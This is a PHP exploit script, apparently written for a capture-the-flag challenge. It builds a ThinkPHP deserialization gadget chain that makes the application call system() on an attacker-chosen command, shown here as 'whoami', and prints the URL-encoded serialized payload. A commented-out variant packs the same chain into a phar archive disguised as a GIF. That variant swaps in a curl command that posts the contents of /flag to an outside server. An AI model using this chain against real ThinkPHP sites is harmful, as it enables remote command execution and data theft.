<?php

namespace think\process\pipes {
    class Windows
    {
        private $files;
        public function __construct($files)
        {
            $this->files = array($files);
        }
    }
}

namespace think\model\concern {
    trait Conversion
    {
        protected $append = array("test" => "1");
    }

    trait Attribute
    {
        private $data;
        private $withAttr = array("test" => "system");

        public function get($system)
        {
            $this->data = array("test" => "$system");
        }
    }
}
namespace think {
    abstract class Model
    {
        use model\concern\Attribute;
        use model\concern\Conversion;
    }
}

namespace think\model{
    use think\Model;
    class Pivot extends Model
    {
        public function __construct($system)
        {
            $this->get($system);
        }
    }
}
namespace{
    $Conver = new think\model\Pivot("whoami");
    $payload = new think\process\pipes\Windows($Conver);
    echo urlencode(serialize($payload));
}
// namespace {
//     $Conver = new think\model\Pivot("curl http://vps/ -d '`tac /flag`';");
//     $payload = new think\process\pipes\Windows($Conver);
//     @unlink("phar.phar");
//     $phar = new Phar("phar.phar"); //后缀名必须为phar
//     $phar->startBuffering();
//     $phar->setStub("GIF89a<?php __HALT_COMPILER(); \?\>"); 设置stub
//     $phar->setMetadata($payload); //将自定义的meta-data存入manifest
//     $phar->addFromString("test.txt", "test"); //添加要压缩的文件
//     //签名自动计算
//     $phar->stopBuffering();
//     echo urlencode(serialize($payload));
// }
